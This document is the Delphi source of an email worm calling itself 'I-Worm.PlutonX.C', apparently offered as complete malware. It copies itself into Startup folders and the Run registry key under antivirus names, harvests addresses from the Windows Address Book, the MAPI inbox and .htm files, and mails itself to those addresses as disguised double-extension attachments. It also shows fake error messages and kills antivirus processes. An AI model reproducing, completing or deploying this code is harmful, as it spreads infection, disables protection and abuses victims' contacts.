PROGRAM PlutonX;

USES
  sClasses in 'ACLUnits\SCLASSES.PAS',
  Registry in 'ACLUnits\REGISTRY.PAS',
  IniFiles in 'ACLUnits\INIFILES.PAS',
  AclUtils in 'ACLUnits\ACLUTILS.PAS',
  P2P in 'P2P.PAS',
  LAN in 'LAN.pas',
  Utils in 'UTILS.PAS',
  Email in 'EMAIL.PAS',
  KillAV in 'KILLAV.PAS',
  GetProc in 'GETPROC.PAS',
  MainStrings in 'MAINSTRINGS.PAS',
  Windows;

VAR
  Emails                : TStrings;
  Msg                   : TMsg;
  hMutex                : THandle;
  ApplicationHandle     : HWND;
  SendMailBusy          : BOOL;
  WABExists             : BOOL;
  PlutonxRegKey         : STRING;
  Extensions1           : XArray;
  Extensions2           : XArray;
  Bodys                 : XArray;
  ErrorMessages         : XArray;
  Attachments           : XArray;
  Subjects              : XArray;
  SentEmail             : WORD;
  NumberOfExtensions1   : WORD;
  NumberOfExtensions2   : WORD;
  NumberOfBodys         : WORD;
  NumberOfErrorMessages : WORD;
  NumberOfAttachments   : WORD;
  NumberOfSubjects      : WORD;

{$I Resources\TEXTENSIONS1.INI}
{$I Resources\TEXTENSIONS2.INI}
{$I Resources\TERRORMESSAGES.INI}
{$I Resources\TATTACHMENTS.INI}
{$I Resources\TSUBJECTS.INI}
{$I Resources\TBODYS.INI}

FUNCTION RandomFileName : STRING;
VAR
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    RESULT:=RESULT+Chars[Random(61)+1];
  UNTIL Length(RESULT)=FileNameLength;
  RESULT:=RESULT+MainStr[5];                                                    //".exe"
END;

PROCEDURE InfectStartUpDir;
VAR
  S : STRING;
  O : STRING;
BEGIN
  O:=SoftwareMic+MainStr[29];                                                   //"Windows\CurrentVersion\explorer\Shell Folders"

  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(O,True);
  S:=Reg.ReadString(MainStr[27])+'\';                                           //"Startup"
  IF S<>'' THEN CopyFiles(True,S+RandomFileName);
  Reg.CloseKey;

  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(O,True);
  S:=Reg.ReadString(MainStr[30])+'\';                                           //"Common Startup"
  IF S<>'' THEN CopyFiles(True,S+RandomFileName);
  Reg.CloseKey;
END;

PROCEDURE WinIni;
VAR
  IniFile : TIniFile;
BEGIN
  IniFile:=TIniFile.Create(MainStr[31]);                                        //"win.ini"
  IniFile.WriteString(MainStr[32],MainStr[33],MainStr[31]);                     //"Windows","","rundll32_.exe"
  IniFile.Free;
END;

PROCEDURE RegWinStart;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+MainStr[35],True);                                    //"Windows\CurrentVersion\Run"
  S:=AVName[Random(NumberOfAVNames)];
  IF Pos('.',S)>0 THEN SetLength(S,Pos('.',S)-1);
  Reg.WriteString(S,Winpath+RandomFileName);
  Reg.CloseKey;
  CopyFiles(True,Winpath+RandomFileName);
END;

PROCEDURE QuickSort(Left,Right:WORD);
VAR
  Up,Down : WORD;
  Compare : STRING;
BEGIN
  Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right) DIV 2];
  REPEAT
    WHILE Emails.Strings[Up]<Compare DO Inc(Up);
    WHILE Compare<Emails.Strings[Down] DO Dec(Down);
    IF Up<=Down THEN BEGIN
      Emails.Exchange(Up,Down);
      Inc(Up);Dec(Down);
    END;
  UNTIL Up>Down;
  IF Left<Down THEN QuickSort(Left,Down);
  IF Up<Right  THEN QuickSort(Up,Right);
END;

PROCEDURE KillDupes;
VAR
  I : DWORD;
BEGIN
  FOR I:=Emails.Count-2 DOWNTO 0 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
END;

FUNCTION GetPlutonXRegKey : STRING;
VAR
  I    : DWORD;
  O    : WORD;
  Keys : TStrings;
  S    : STRING;
BEGIN
  Keys:=TStringList.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(MainStr[39],False);                                               //"\SOFTWARE"
  Reg.GetKeyNames(Keys);

  FOR I:=0 TO Keys.Count-1 DO
    FOR O:=1 TO NumberOfAVNames DO
      IF(Keys.Strings[I]=Copy(AVName[O],1,Pos('.',AVName[O])-1))AND(Reg.KeyExists(Keys.Strings[I]))AND(Keys.Strings[I]<>'') THEN BEGIN
        Reg.OpenKey(Software+Keys.Strings[I],False);
        IF(Reg.ValueExists(MainStr[38]))AND(Reg.ValueExists(MainStr[37])) THEN S:=Keys.Strings[I]; //"Sent","email_num"
      END;

  RESULT:=S;
  IF S='' THEN BEGIN
    RESULT:=AVName[Random(NumberOfAVNames-1)+1];
    IF (POS('.',RESULT)>0) THEN SetLength(RESULT,Pos('.',RESULT)-1);
  END;

  Keys.Free;
  Reg.CloseKey;
END;

PROCEDURE ReadWAB;
VAR
  WABFile : FILE;
  b,g     : DWORD;
  i       : STRING;
  n       : ARRAY[1..5] OF Char;
  xx      : ARRAY[1..500] OF Char;
  rr      : WORD;
  WABPath : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(SoftwareMic+MainStr[36],False);                                   //"WAB\WAB4\WAB File Name"
  WABPath:=Reg.ReadString('');
  IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
    WABExists:=True;
    Assign(WABFile,WABPath);
    Reset(WABFile,1);
    Seek(WABFile,176199);
    REPEAT
      BlockRead(WABFile,N,5);
      IF N[1]+N[2]+N[3]+N[4]=#01#31#00#03 THEN BEGIN
        BlockRead(WABFile,XX,Ord(N[5])+30);
        I:='';
        FOR RR:=1 TO Ord(N[5])+30 DO I:=I+XX[RR];
        Delete(I,1,3);
        G:=Pos(#00#00#00,I);
        IF G>0 THEN Delete(I,G,Length(I)-G+1);
        FOR B:=1 TO Ord(N[5]) DO IF I[B]=#00 THEN Delete(I,B,1);
        IF (Pos('@',I)>0)AND(I[1]<>'/') THEN Emails.ADD(UpperCase(I));
      END ELSE Seek(WABFile,FilePos(WABFile)-4);
    UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
    QuickSort(1,Emails.Count-1);
    KillDupes;
  END;
  IF NOT FileExists(WABPath) THEN WABExists:=False;
  Close(WABFile);
  Reg.CloseKey;
END;

PROCEDURE WriteEmailsReg;
VAR
  I : DWORD;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(Software+PlutonXRegKey,True);
  FOR I:=0 TO Emails.Count-1 DO Reg.WriteString(IntToStr(I),Emails.Strings[I]);
  Reg.WriteInteger(MainStr[37],Emails.Count);                                   //"email_num"
  Reg.WriteInteger(MainStr[38],SenteMail);                                      //"sent"
  Reg.CloseKey;
END;

PROCEDURE ReadEmailsReg;
VAR
  I : DWORD;
BEGIN
  Emails.Add(PlutonXX);
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.OpenKey(Software+PlutonXRegKey,False) THEN
    FOR I:=0 TO Reg.ReadInteger(MainStr[37])-1 DO Emails.Add(Reg.ReadString(IntToStr(I))); //"email_num"
  Reg.CloseKey;
END;

PROCEDURE GetNumberOfSentEmails;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.KeyExists(Software+PlutonXRegKey) THEN BEGIN
    Reg.OpenKey(Software+PlutonXRegKey,True);
    SentEmail:=Reg.ReadInteger(MainStr[38]);                                    //"sent"
  END ELSE SentEmail:=0;
  Reg.CloseKey;
END;

FUNCTION GetFirstRun : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(MainStr[39],false);                                               //"\Software"
  RESULT:= NOT Reg.KeyExists(PlutonXRegKey);
  Reg.CreateKey(PlutonxRegKey);
  Reg.CloseKey;
END;

PROCEDURE ReadInbox;
VAR
  OSInfo                    : TOSVersionInfo;
  MAPIMessage               : TMAPIMessage;
  lppMapiMessage            : PMapiMessage;
  MError                    : Cardinal;
  MapiSession               : DWORD;
  bFindFirst                : BOOL;
  ProfileName               : STRING;
  sSeedMessageID,sMessageID : lpup;
  I                         : BYTE;
BEGIN
  OSInfo.dwOSVersionInfoSize:=SizeOf(OSInfo);
  GetVersionEx(OSInfo);
  Reg.RootKey:=HKEY_CURRENT_USER;
  IF OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN BEGIN
    Reg.OpenKey(SoftwareMic+MainStr[40],False);                                 //"Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles"
    ProfileName:=Reg.ReadString(MainStr[41]);                                   //"DefaultProfile"
  END ELSE BEGIN
    Reg.OpenKey(SoftwareMic+MainStr[42],False);                                 //"Windows Messaging Subsystem\Profiles"
    ProfileName:=Reg.ReadString(MainStr[41]);                                   //"DefaultProfile"
  END;
  TRY
    MError:=MapiLogOn(0,PChar(ProfileName),NIL,MAPI_NEW_SESSION,0,MapiSession);
    IF (MError<>SUCCESS_SUCCESS) THEN Exit;
  EXCEPT
    ;
  END;
  bFindFirst:=True;
  FOR I:=1 TO 50 DO TRY
    IF bFindFirst THEN bFindFirst:=False ELSE sSeedMessageID:=sMessageID;
    MError:=MapiFindNext(MapiSession,0,NIL,sSeedMessageID,0,0,sMessageID);
    IF MError=SUCCESS_SUCCESS THEN BEGIN
      lppMapiMessage:=@MAPIMessage;
      MError:=MAPIReadMail(MAPISession,0,@sMessageID,MAPI_ENVELOPE_ONLY,0,lppMapiMessage);
      IF (MError=SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN Emails.Add(UpperCase(lppMapiMessage.lpOriginator.lpszAddress));
    END;
  EXCEPT
  END;
  QuickSort(1,Emails.Count-1);
  KillDupes;
  WriteEmailsReg;
  TRY
    MapiLogOff(MapiSession,0,0,0);
  EXCEPT
    ;
  END;
  Reg.CloseKey;
END;

PROCEDURE SendEmail;
VAR
  S : STRING;
BEGIN
  IF (InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
    SendMailBusy:=True;
    Inc(SentEmail);
    IF SentEmail>Emails.Count-1 THEN SentEmail:=1;
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKey(Software+PlutonXRegKey,True);
    Reg.WriteInteger(MainStr[38],SentEmail);                                    //"Sent"
    Reg.CloseKey;
    S:=Attachments[Random(NumberOfAttachments-1)+1]+'.'+Extensions1[Random(NumberOfExtensions1-1)+1]+'.'+Extensions2[Random(NumberOfExtensions2-1)+1];
    CopyFiles(True,WinPath+S);
    TRY
      IF SentEmail>0 THEN Email.SendEmail(Subjects[Random(NumberOfSubjects-1)+1],Bodys[Random(NumberOfBodys-1)+1],Emails[SentEmail],WinPath,S);
      IF FileExists(WinPath+S) THEN DeleteFile(pChar(WinPath+S));
    EXCEPT
    END;
  END;
  SendMailBusy:=False;
END;

PROCEDURE ClearEmail(S:STRING);
VAR
  B : WORD;
  C : STRING;
BEGIN
  FOR B:=Pos('@',S)+1 TO Length(S) DO
    IF ((S[B]<'a')OR(S[B]>'z'))AND((S[B]<'0')OR(S[B]>'9'))AND((S[B]<'A')OR(S[B]>'Z'))AND(S[B]<>'.')AND(S[B]<>'-')AND(S[B]<>'_') THEN BEGIN
      Delete(S,B,Length(S));
      Break;
    END;
    C:=Copy(S,1,1);
  IF ((C>='A')AND(C<='Z'))OR((C>='a')AND(C<='z')) THEN
  IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
END;

PROCEDURE FindMail(EFile:AnsiString);
VAR
  F : TextFile;
  I : WORD;
BEGIN
  IF FileExists(EFile) THEN BEGIN
    AssignFile(F,EFile);
    Reset(F);
    REPEAT
      ReadLn(F,EFile);
      EFile:=UpperCase(EFile);
      I:=Pos('LTO:',EFile);
      IF I>0 THEN BEGIN
        Delete(EFile,1,I+3);
        I:=Pos('"',EFile);
        IF I>0 THEN Delete(EFile,I,Length(EFile));
        ClearEmail(EFile);
      END;
    UNTIL EOF(F);
    CloseFile(F);
  END;
END;

PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
VAR
  D     : TSearchRec;
  Error : Integer;
BEGIN
  Error:=FindFirst(Path+fSpec,faAnyFile,D);
  WHILE Error=0 DO BEGIN
    FindMail(Path+D.Name);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE SearchAllDir;
VAR
  I : BYTE;
BEGIN
  FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
END;

PROCEDURE CopyInfectedFiles;
BEGIN
  CopyFiles(True,Winpath+MainStr[34]);                                          //"rundll32_.exe"
  InfectStartUpDir;
END;

PROCEDURE DelRegedit;
BEGIN
  IF FileExists(WinPath+MainStr[44]) THEN DeleteFile(pChar(WinPath+MainStr[44]));  //"regedit.exe"
END;

PROCEDURE InitTimers;
BEGIN
//  SetTimer(ApplicationHandle,2,60000,@SendEmail);
  SetTimer(ApplicationHandle,3,4000,@KillAV.AVKiller);
END;

PROCEDURE StartWorm;
VAR
  FirstRun : BOOL;
BEGIN
  INITS;
  PlutonXX:=pChar(MainStr[45]);                                                 //"I-Worm.PlutonX.C"
  Software:=pChar(MainStr[46]);                                                 //"\SOFTWARE\"
  SoftwareMic:=pChar(MainStr[47]);                                              //"\SOFTWARE\Microsoft\"
  InitProcesses;
  InitEmailProcesses;
  NumberOfExtensions1:=DecodeStrings(TExtensions1,Extensions1);
  NumberOfExtensions2:=DecodeStrings(TExtensions2,Extensions2);
  NumberOfBodys:=DecodeStrings(TBodys,Bodys);
  NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
  NumberOfAttachments:=DecodeStrings(TAttachments,Attachments);
  NumberOfSubjects:=DecodeStrings(TSubjects,Subjects);
  NumberOfAVNames:=DecodeStrings(TAVName,AVName);
  ApplicationHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
  SetWinPath;
//  DelRegedit;
  SendMailBusy:=False;
  Randomize;
  Reg:=TRegistry.Create;
//  PlutonXRegKey:=GetPlutonxRegKey;
  Emails:=TStringList.Create;
  KillAV.AVKiller;
{ FirstRun:=GetFirstRun;
  IF FirstRun THEN IF Pos('STARTUP',UpperCase(Paramstr(0)))=0 THEN MessageBox(ApplicationHandle,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND)
  ELSE InitTimers;
  InitPeerToPeer;
  CopyInfectedFiles;
  WinIni;
  IF FirstRun THEN BEGIN
    RegWinStart;
    Emails.Add(PlutonXX);
    SearchAllDir;
    ReadWab;
    ReadInBox;
  END ELSE BEGIN
    GetNumberOfSentEmails;
    ReadEmailsReg;
    ReadInBox;
  END;
  hThread:=BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);}
END;

BEGIN
  hMutex:=CreateMutexA(NIL,False,PlutonXX);
  IF WaitForSingleObject(hMutex,0)<>Wait_TimeOut THEN StartWorm;
  WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
END.
